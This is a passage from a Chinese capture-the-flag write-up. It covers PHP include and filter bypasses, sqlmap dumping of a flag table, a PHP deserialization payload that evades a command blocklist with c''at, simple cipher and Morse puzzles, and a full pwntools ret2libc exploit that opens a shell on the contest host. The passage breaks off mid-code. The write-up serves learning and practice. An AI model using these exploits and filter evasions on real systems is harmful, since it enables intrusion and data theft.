id=\"游戏高手\"><a class=\"markdownIt-Anchor\" href=\"#游戏高手\">#</a> 游戏高手</h3>\n<p>直接修改当前游戏的 gameScore 值，即可获得 flag</p>\n<p><img data-src=\"image-20231009120718139.png\" alt=\"image-20231009120718139\"></p>\n<p><code>flag&#123;d37b9e39-db1d-44c0-9857-a13e2d050ff6&#125;</code></p>\n<h3 id=\"include-0-0\"><a class=\"markdownIt-Anchor\" href=\"#include-0-0\">#</a> include 0。0</h3>\n<p>包含也有危害？</p>\n<p>题目：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// FLAG in the flag.php</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token variable\">$file</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$_GET</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/base|rot/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    @<span class=\"token keyword\">include</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"nope\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token delimiter important\">?></span></pre></td></tr></table></figure><p>用 filter 获得相关参数：</p>\n<pre><code>http://8f160d03-3828-4fc4-86db-8799b5445d6f.node4.buuoj.cn:81/?file=php://filter/convert.base64-encode/resource=flag.php\n</code></pre>\n<p>但是这样会被检测到 base，使用 hackbar 的 Encoding 功能，将 base64 字段编译两次：</p>\n<pre><code>http://8f160d03-3828-4fc4-86db-8799b5445d6f.node4.buuoj.cn:81/?file=php://filter/convert.%25%36%32%25%36%31%25%37%33%25%36%35%25%33%36%25%33%34-encode/resource=flag.php\n</code></pre>\n<p>在传入就可以获得 flag 的 base64 格式，解码后得到答案：</p>\n<pre><code>PD9waHAgLy9mbGFne2FkNTgyMGFmLTI3NGYtNDdlNC04NTE1LTY4ZjBmYWI3ZjAyOH0K\n</code></pre>\n<p><img data-src=\"image-20231009172652269.png\" alt=\"image-20231009172652269\"></p>\n<p><code>flag&#123;ad5820af-274f-47e4-8515-68f0fab7f028&#125;</code></p>\n<h3 id=\"ez_sql\"><a class=\"markdownIt-Anchor\" href=\"#ez_sql\">#</a> ez_sql</h3>\n<p>题目如下：</p>\n<p><img data-src=\"image-20231010174741588.png\" alt=\"image-20231010174741588\"></p>\n<p>直接用 sqlmap 开查，先查看有什么 table：</p>\n<pre><code>sqlmap -u http://289cffc1-b11a-4434-9d3a-0712195f3120.node4.buuoj.cn:81/?id=TMP0919 --dbs\n</code></pre>\n<p><img data-src=\"image-20231010175019340.png\" alt=\"image-20231010175019340\"></p>\n<p>其中我们的 flag 在 ctf 表中：</p>\n<pre><code>sqlmap -u http://289cffc1-b11a-4434-9d3a-0712195f3120.node4.buuoj.cn:81/?id=TMP0919 -D ctf --tables\n</code></pre>\n<p><img data-src=\"image-20231010175114105.png\" alt=\"image-20231010175114105\"></p>\n<p>得到 flag：</p>\n<pre><code>sqlmap -u http://289cffc1-b11a-4434-9d3a-0712195f3120.node4.buuoj.cn:81/?id=TMP0919 -D ctf -T here_is_flag --dump\n</code></pre>\n<p><img data-src=\"image-20231010175142543.png\" alt=\"image-20231010175142543\"></p>\n<h3 id=\"unserialize\"><a class=\"markdownIt-Anchor\" href=\"#unserialize\">#</a> Unserialize？</h3>\n<p><span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzUzNTY3MDY1L2FydGljbGUvZGV0YWlscy8xMjc5MDA3MTg=\">什么是 PHP 反序列化？</span></p>\n<p>本题考查 PHP 反序列化，题目如下：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">highlight_file</span><span class=\"token punctuation\">(</span><span class=\"token constant\">__FILE__</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token comment\">// Maybe you need learn some knowledge about deserialize?</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">evil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">private</span> <span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/cat|tac|more|tail|base/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>            @<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>@<span class=\"token function\">unserialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'unser'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></pre></td></tr></table></figure><p>先构造查看根目录的反序列化 php：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">evil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">private</span> <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"ls la /\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/cat|tac|more|tail|base/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> @<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">evil</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></pre></td></tr></table></figure><p>结果如下所示：</p>\n<p><img data-src=\"image-20231010191929591.png\" alt=\"image-20231010191929591\"></p>\n<p>发现我们想要的 flag，再构造反序列化，由于 cat 被过滤了，直接使用 cat 会在构造后的语句中含有 cat，所以使用 <code>c''at</code>  重新构造，获得该 flag：</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">evil</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre> <span class=\"token keyword\">private</span> <span class=\"token variable\">$cmd</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"c''at /th1s_1s_fffflllll4444aaaggggg\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre> <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"/cat|tac|more|tail|base/i\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre> @<span class=\"token function\">system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">evil</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">echo</span> <span class=\"token function\">urlencode</span><span class=\"token punctuation\">(</span><span class=\"token function\">serialize</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token delimiter important\">?></span></pre></td></tr></table></figure><p><img data-src=\"image-20231010192329198.png\" alt=\"image-20231010192329198\"></p>\n<p><code>flag&#123;7626fe20-384c-4362-acd8-3f74fdf9b6e9&#125;</code></p>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"新建word文档\"><a class=\"markdownIt-Anchor\" href=\"#新建word文档\">#</a> 新建 Word 文档</h3>\n<p>打开题目，其中包含一个 word 文档，打开之后发现一片空白，这时候，我们找到 word 选项，显示这里，将隐藏文字打开，就可以看到一堆不明所以的话：</p>\n<pre><code>新佛曰：毘諸隸僧降吽諸陀摩隸僧缽薩願毘耨咤陀願羅咤喃修願宣亦宣寂叻寂阿是吽阿塞尊劫毘般毘所聞降毘咒塞尊薩咒毘所若降般斯毘嚴毘嚴波斯迦毘色毘波嚴毘喃念若修嘚般毘我毘如毘如囑囑\n</code></pre>\n<p>查了一下，是一种密码，打开<span class=\"exturl\" data-url=\"aHR0cDovL2hpLnBjbW9lLm5ldC9idWRkaGEuaHRtbA==\">在线网站</span>揭秘如下：</p>\n<p><img data-src=\"image-20231009155007685.png\" alt=\"image-20231009155007685\"></p>\n<p><code>flag&#123;Th1s_F0_1s_s00_Cyp3r_495586e3df3a&#125;</code></p>\n<h3 id=\"永不消逝的电波\"><a class=\"markdownIt-Anchor\" href=\"#永不消逝的电波\">#</a> 永不消逝的电波</h3>\n<p>题目是一段音频，停了一下，感觉是摩尔斯电码，手动打出来如下：</p>\n<pre><code>..-. .-.. .- --. - .... . -... . ... - -.-. - ..-. . .-. .. ... -.-- --- ..- \n</code></pre>\n<p>再用翻译器翻一下：</p>\n<pre><code>FLAGTHEBESTCTFERISYOU\n</code></pre>\n<p><code>flag&#123;thebestctferisyou&#125;</code></p>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> PWN</h2>\n<h3 id=\"ret2libc\"><a class=\"markdownIt-Anchor\" href=\"#ret2libc\">#</a> ret2libc</h3>\n<p>首先查看安全检查：</p>\n<p><img data-src=\"image-20231010194410389.png\" alt=\"image-20231010194410389\"></p>\n<p>使用 IDA 查看代码：</p>\n<p><img data-src=\"image-20231012092339639.png\" alt=\"image-20231012092339639\"></p>\n<p>发现有栈溢出，但是没有任何的漏洞函数，但是有 libc 函数，和 puts 函数，说明该题是需要我们自己利用 libc 中的 system 函数进行渗透。在 linux 延迟绑定机制中，当程序调用库函数时，会将 libc.so 文件中的函数地址写到程序的 got 表中，调用时会跳转到 got 表所写的地址。那么我们如果要调用 system 函数，就要知道他的 got 表中的地址，got 表中的地址指的就是当系统将 libc（动态链接库）加载到内存中时，库中的函数的地址。但 libc 被加载到的内存的位置是随机的，我们无从得知。但是，同一版本的 libc 的两个库函数在 libc 中的相对位置是不变的，所以如果我们可以知道一个已经执行过的函数的 got 表地址，然后确定 libc 的版本，就可以加上和 system 函数的偏移，从而得到 system 函数的真实地址，即 got 表地址。碰巧的是，我们拥有一个 puts 函数，我们可以用 puts 函数，将一个已经执行过的函数的 got 表地址打印出来，然后再根据地址获取 libc 版本，确定偏移，得到真实地址；并且，在 libc 中，存在着 system 函数和 /bin/sh 字符串，所以我们只需要考虑如何得到一个执行过的函数的真实地址即可，并不需要考虑如何写入 /bin/sh 字符串。本题可以利用 puts 函数打印自身的 got 表。</p>\n<p><img data-src=\"image-20231012093039549.png\" alt=\"image-20231012093039549\"></p>\n<p>64 位程序的参数从左到右依次放入寄存器: rdi, rsi, rdx, rcx, r8, r9 中。我们使用的 puts 函数只需要传入一个参数，所以只需要一个寄存器 rdi 即可。通过 <code>ROPgadge</code>  查找我们能够利用的语句地址：</p>\n<p><img data-src=\"image-20231010214546832.png\" alt=\"image-20231010214546832\"></p>\n<p>我们采用  <code>0x400763 </code>  的语句，先在本地进行尝试：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># context.terminal = ['tmux','splitw','-h']   #需要装分屏工具</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sh <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'ret2libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'ret2libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>start_address <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>rdi_address <span class=\"token operator\">=</span> <span class=\"token number\">0x400763</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">32</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi_address<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>start_address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Show me your magic again\"</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>puts_address <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*]leak puts addr: \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>可以成功得到 puts 本地的地址：</p>\n<pre><code>leak puts addr: 0x?????????\n</code></pre>\n<p>再添加如下语句得到本地 libc 库中的 system 和 /bin/sh 的地址：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>base_address <span class=\"token operator\">=</span> puts_address <span class=\"token operator\">-</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"puts\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>system_address <span class=\"token operator\">=</span> base_address <span class=\"token operator\">+</span> libc<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">\"system\"</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>binsh_address <span class=\"token operator\">=</span> base_address <span class=\"token operator\">+</span> <span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span>libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">b'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>最后通过如下代码进行构建获取 shell，这里如果不添加 ret_addr 的话就会导致栈不对齐，程序会直接终止运行，加入一个无关紧要的返回语句进行对齐：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>ret_addr <span class=\"token operator\">=</span> <span class=\"token number\">0x400506</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>payload2 <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">32</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>ret_addr<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi_address<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>binsh_address<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>system_address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Show me your magic again\"</span><span class=\"token punctuation\">,</span>payload2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>sh<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>这个时候我们已经可以在本地成功的获取到 shell 了，现在进行靶机的攻入：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\"># context.terminal = ['tmux','splitw','-h']   #需要装分屏工具</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>sh <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28845</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token comment\"># sh = process('ret2libc')</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>context<span class=\"token punctuation\">(</span>log_level <span class=\"token operator\">=</span> <span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>elf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'ret2libc'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'/lib/x86_64-linux-gnu/libc.so.6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>puts_plt <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>puts_got <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>start_address <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>symbols<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>rdi_address <span class=\"token operator\">=</span> <span class=\"token number\">0x400763</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">32</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>rdi_address<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_got<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>puts_plt<span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> p64<span class=\"token punctuation\">(</span>start_address<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>sh<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">\"Show me your magic again\"</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>puts_address <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>sh<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*]leak puts addr: \"</span> <span class=\"token operator\">+</span> <span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>puts_address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>第一次进行传入可以查看到靶机的 libc.puts 函数的真实地址：</p>\n<pre><code>leak puts addr: 0x7f4254048970\n</code></pre>\n<p>利用其地址的最后三位 970 在网站上查询远程所使用的 libc 库版本：</p>\n<p><img data-src=\"image-20231012140630752.png\" alt=\"image-20231012140630752\"></p>\n<p>可以发现找到了四个符合的 libc 版本，其中每个函数的 offset 已经标出，在程序中进行替换即可。经过多次测试，发现第三个库版本是我们需要的库版本。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td 